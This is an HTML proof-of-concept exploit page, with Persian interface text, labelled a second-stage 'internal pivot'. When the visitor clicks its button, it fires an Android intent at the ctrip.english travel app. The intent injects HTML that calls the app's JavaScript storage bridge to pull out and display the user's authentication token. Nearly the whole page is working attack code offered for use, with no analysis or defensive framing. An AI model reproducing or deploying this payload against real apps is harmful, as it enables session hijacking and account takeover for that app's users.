<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Internal Pivot Exploit</title>
    <style>
        body { background: #161b22; color: #c9d1d9; font-family: sans-serif; text-align: center; padding: 40px; }
        .btn { background: #238636; color: white; padding: 20px 30px; border-radius: 8px; font-weight: bold; font-size: 1.2rem; cursor: pointer; border: none; display: inline-block; }
        .status { margin-top: 20px; color: #8b949e; font-family: monospace; }
    </style>
</head>
<body>
    <h1>مرحله دوم: شلیک اینتنت داخلی</h1>
    <p>شما اکنون داخل مرورگر اپلیکیشن هستید. برای استخراج توکن کلیک کنید:</p>

    <button class="btn" onclick="fireIntent()">استخراج نهایی توکن (Auth)</button>
    <div class="status" id="stat">آماده شلیک...</div>

    <script>
        function fireIntent() {
            document.getElementById('stat').innerText = "در حال ارسال اینتنت به لایه عمیق‌تر...";
            
            // ۱. کد نهایی که قرار است توکن را چاپ کند
            const finalPayload = `
            <html><body style="background:black;color:lime;padding:20px;font-family:monospace;">
                <h2>[SUCCESS] PRIVILEGED ACCESS</h2>
                <div id="out">Reading Auth Token...</div>
                <script>
                    window.__bridge_callback = function(data) {
                        try {
                            var decoded = atob(data);
                            document.getElementById('out').innerHTML = "<h3>TOKEN FOUND:</h3>" + decoded;
                        } catch(e) { document.getElementById('out').innerText = "Error: " + e.message; }
                    };
                    setTimeout(() => {
                        if(window.IBUStorageV2_a) {
                            window.IBUStorageV2_a.IBUGetUserValue(JSON.stringify({
                                "bussiness": "common", 
                                "key": "token",
                                "callback_tagname": "Storage_token"
                            }));
                        } else { document.getElementById('out').innerText = "Bridge Blocked!"; }
                    }, 1000);
                <\/script>
            </body></html>`;

            // ۲. ساخت لینک Intent با پارامتر HTML_DATA_TO_LOAD
            const encodedData = encodeURIComponent(finalPayload);
            const intentURL = "intent:#Intent;scheme=ctripglobal;package=ctrip.english;S.HTML_DATA_TO_LOAD=" + encodedData + ";end";

            // ۳. شلیک!
            window.location.href = intentURL;
        }
    </script>
</body>
</html>
